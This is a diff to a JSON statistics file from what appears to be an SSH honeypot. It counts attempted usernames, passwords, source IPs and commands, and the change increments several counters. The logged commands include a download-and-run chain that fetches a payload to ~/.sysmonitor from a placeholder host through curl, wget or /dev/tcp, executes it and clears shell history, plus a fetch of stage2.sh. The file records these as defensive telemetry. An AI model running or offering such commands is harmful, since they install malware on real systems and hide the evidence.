@@ -1,9 +1,9 @@
 {
-  "LastUpdated": "2026-10-29T06:47:14.4416483Z",
+  "LastUpdated": "2026-10-29T06:47:29.6793389Z",
   "TotalUniqueUsernames": 784,
-  "TotalUniquePasswords": 1411,
+  "TotalUniquePasswords": 1412,
   "TotalUniqueSourceIps": 1489,
-  "TotalUniqueCommands": 192,
+  "TotalUniqueCommands": 193,
   "Usernames": {
     "root": 5051,
     "admin": 1595,
@@ -788,7 +788,7 @@
     "kiko": 1,
     "anonymous": 1,
     "deployment-probe": 3,
-    "bridge-deployment-probe": 5
+    "bridge-deployment-probe": 6
   },
   "Passwords": {
     "root": 154,
@@ -2201,7 +2201,8 @@
     "synthetic-bridge-check-1": 2,
     "synthetic-bridge-check-8": 1,
     "synthetic-bridge-check-14": 1,
-    "synthetic-bridge-final-0": 1
+    "synthetic-bridge-final-0": 1,
+    "synthetic-bridge-final-1": 1
   },
   "SourceIps": {
     "109.63.128.10": 6,
@@ -2489,7 +2490,7 @@
     "116.110.22.220": 56,
     "163.7.4.169": 4,
     "35.187.231.181": 11,
-    "172.18.0.1": 66,
+    "172.18.0.1": 72,
     "118.121.203.170": 12,
     "172.18.0.3": 86,
     "187.8.120.90": 3,
@@ -3886,6 +3887,7 @@
     "curl -s http://{{HOST_1}}/stage2.sh -o /tmp/{{TMP_FILE_1}}": 1,
     "curl -sSL http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: {{HOST_1}}\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1,
     "LC_ALL=C printf \u0027funnypot-kilo-production-20261029-0619\\n\u0027; uname -s": 1,
-    "LC_ALL=C printf \u0027funnypot-minimal-bridge-20261029-0636\\n\u0027; uname -s": 1
+    "LC_ALL=C printf \u0027funnypot-minimal-bridge-20261029-0636\\n\u0027; uname -s": 1,
+    "LC_ALL=C printf \u0027funnypot-minimal-bridge-20261029-0647\\n\u0027; uname -s": 1
   }
 }
